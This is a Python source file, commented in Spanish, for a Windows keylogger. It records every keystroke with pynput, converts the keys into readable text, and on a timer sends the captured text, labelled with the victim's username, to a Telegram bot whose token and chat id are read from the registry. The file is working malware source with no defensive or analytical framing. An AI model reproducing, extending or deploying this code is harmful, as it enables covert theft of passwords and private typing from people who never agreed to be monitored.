import telebot  # REG_TELEGRAM API
from lib.winregistry import WinRegistry
from pynput.keyboard import Listener  # Escucha eventos del teclado
from lib.pathreg import *
import time  # Contar segundos
from lib.util import Util
import threading  # procesos multihilos

buffer = []


def format_key(numberKey):  # Caracteres Comunes // Optimizados
    switcher = {
        # Vocales Minisculas
        "'a'": "a",
        "'e'": "e",
        "'i'": "i",
        "'o'": "o",
        "'u'": "u",
        # Letras  Minusculas
        "'b'": "b",
        "'c'": "c",
        "'d'": "d",
        "'f'": "f",
        "'g'": "g",
        "'h'": "h",
        "'j'": "j",
        "'J'": "J",
        "'k'": "k",
        "'l'": "l",
        "'m'": "m",
        "'n'": "n",
        "'ñ'": "ñ",
        "'p'": "p",
        "'q'": "q",
        "'r'": "r",
        "'s'": "s",
        "'t'": "t",
        "'v'": "v",
        "'w'": "w",
        "'x'": "x",
        "'y'": "y",
        "'z'": "z",
        # Caracteres
        "','": ",",  # ,
        "'.'": ".",  # .
        "'_'": "_",  # _
        "'-'": "-",  # -
        "':'": ":",  #
        # Vocales Mayúsculas
        "'A'": "A",
        "'E'": "E",
        "'I'": "I",
        "'O'": "O",
        "'U'": "U",
        # Letras Mayúsculas
        "'B'": "B",
        "'C'": "C",
        "'D'": "D",
        "'F'": "F",
        "'G'": "G",
        "'H'": "H",
        "'K'": "K",
        "'L'": "L",
        "'M'": "M",
        "'N'": "N",
        "'Ñ'": "Ñ",
        "'P'": "P",
        "'Q'": "Q",
        "'R'": "R",
        "'S'": "S",
        "'T'": "T",
        "'V'": "V",
        "'W'": "W",
        "'X'": "X",
        "'Y'": "Y",
        "'Z'": "Z",
        # Números Standard
        "'1'": "1",
        "'2'": "2",
        "'3'": "3",
        "'4'": "4",
        "'5'": "5",
        "'6'": "6",
        "'7'": "7",
        "'8'": "8",
        "'9'": "9",
        "'0'": "0",
        # Caracteres Especiales
        "'@'": "@",  # @
        "'#'": "#",  # #
        "'*'": "*",  # *
        "'('": "(",  # (
        "')'": ")",  # )
        '"\'"': "'",  # '
        "'\"'": '"',  # "
        "'?'": "?",  # ?
        "'='": "=",  # =
        "'+'": "+",  # +
        "'!'": "!",  # !
        "'}'": "}",  # }
        "'{'": "{",  # {}
        "'´'": "´",  # ´
        "'|'": "|",  # |
        "'°'": "°",  # °
        "'^'": "¬",  # ^
        "';'": ";",  #
        "'$'": "$",  # $
        "'%'": "%",  # %
        "'&'": "&",  # &
        "'>'": ">",  #
        "'<'": "<",  #
        "'/'": "/",  # /
        "'¿'": "¿",  # ¿
        "'¡'": "¡",  # ¡
        "'~'": "~",  #
        "Key.space": " ",  # Espacio
        "Key.backspace": "⋪",  # Borrar
        "Key.enter": "\n",  # Salto de linea
        "Key.tab": "    ",  # Tabulación
        "Key.delete": "❌",  # Suprimir
        # Números
        "<96>": "0",  # 0
        "<97>": "1",  # 1
        "<98>": "2",  # 2
        "<99>": "3",  # 3
        "<100>": "4",  # 4
        "<101>": "5",  # 5
        "<102>": "6",  # 6
        "<103>": "7",  # 7
        "<104>": "8",  # 8
        "<105>": "9",  # 9
        "<181>": "♪",  # Open Music ♪

        # Números Númeral
        "None<96>": "0",  # 0
        "None<97>": "1",  # 1
        "None<98>": "2",  # 2
        "None<99>": "3",  # 3
        "None<100>": "4",  # 4
        "None<101>": "5",  # 5
        "None<102>": "6",  # 6
        "None<103>": "7",  # 7
        "None<104>": "8",  # 8
        "None<105>": "9",  # 9
        # Teclas raras 2
        "['^']": "^",
        "['`']": "`",  #
        "['¨']": "¨",  #
        "['´']": "´",  #
        "<110>": ".",  #
        "None<110>": ".",  #
        "Key.alt_l": " ◀Alt ",  #
        "Key.alt_r": " Alt▶ ",
        "Key.shift_r": " Shift▶ ",
        "Key.shift": " ◀Shift ",
        "Key.ctrl_r": " Ctrl▶ ",  #
        "Key.ctrl_l": " ◀Ctrl ",  #
        "Key.right": "▶",  #
        "Key.left": "◀",  #
        "Key.up": "🔼",  #
        "Key.down": "🔽",  #
        # "'\x16'"  : " [Pegó] ",
        # "'\x18'"  : " [Cortar] ",
        # "'\x03'"  : " [Copiar] ",
        "Key.caps_lock": " 🔒⌨ ",
        "Key.num_lock": " 🔒🔢 ",
        # "Key.media_previous"    : "⏮",
        # "Key.media_next"        : "⏭",
        # "Key.media_play_pause"  : "⏹",
        # "Key.media_volume_mute" : "🔇",
        # "Key.media_volume_up" : "🔊",
        # "Key.media_volume_down" : "🔉",
        "Key.cmd": " ⊞ "
    }
    return switcher.get(numberKey, "")  # Convierte tecla a un valor legible

def beautifull(key):
    finish = ''
    for x in key:
        finish = finish + format_key(x)
    return finish


def send(text_key):
    id = WinRegistry(REG_TELEGRAM).read_value('id')  # puede haber varios id que se envien simultaneamente
    bot = telebot.TeleBot(WinRegistry(REG_TELEGRAM).read_value('token'), parse_mode=None)

    new_key = "=> "+ USERNAME + " <=\n" + beautifull(text_key)
    try:
        for data in Util().split_string(1700, new_key):
            print(data)

            bot.send_message(id, data)
        print("[Keylogger] Sucess send items_general to: [ID] = " + str(id))
    except:
        print("[Keylogger] there was a mistake when sending the [ID] = " + str(id))
    finally:
        return

def send_time():
    global buffer

    while True:
        time.sleep(WinRegistry(REG_KEYLOGGER).read_value('limit'))
        threading.Thread(target=send(buffer)).start()
        buffer = []


def listen_key():
    global buffer

    print("[KeyLogger] - Listen key [ok]")
    # send_time()
    threading.Thread(target=send_time).start()
    def press(key):
        global buffer
        try:
            k = str(key)
            buffer.append(k)
            print(k)
        except:
            print("[Keylogger] ERROR | there was a mistake getting key apostorfeee?/  ")

    def listen():
        try:
            with Listener(on_press=press) as listener:
                listener.join()
        except KeyError as e :
            print('ERROR | por Apostrofe => reiniciando el problema')
            listen()

    listen()
